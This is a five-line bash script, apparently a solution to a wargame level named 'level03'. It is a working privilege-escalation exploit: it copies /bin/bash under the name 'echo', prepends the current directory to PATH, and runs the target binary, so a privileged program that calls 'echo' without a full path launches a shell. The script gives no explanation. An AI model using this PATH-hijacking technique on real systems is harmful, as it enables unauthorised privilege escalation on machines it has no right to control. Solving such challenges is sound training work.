#!/usr/bin/env bash

echo "getflag" > Exploit
cp /bin/bash echo
export PATH=.:$PATH
./level03